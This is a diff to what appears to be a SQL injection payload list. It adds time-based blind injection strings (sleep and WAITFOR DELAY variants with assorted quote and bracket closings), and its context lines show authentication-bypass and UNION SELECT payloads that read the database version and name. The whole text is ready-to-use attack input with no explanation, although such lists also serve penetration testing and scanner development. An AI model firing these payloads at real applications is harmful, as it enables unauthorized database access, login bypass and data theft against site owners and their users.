@@ -101,7 +101,18 @@ admin") or "1"="1"#
 admin") or "1"="1"/*
 
 ------------------------------------------
+')) or sleep(5)='
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR DELAY '0:0:5'-- 
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
 
+------------------------------------------
 union select 1,2-- -
 union select 1,@@version
 union select all 1,database()
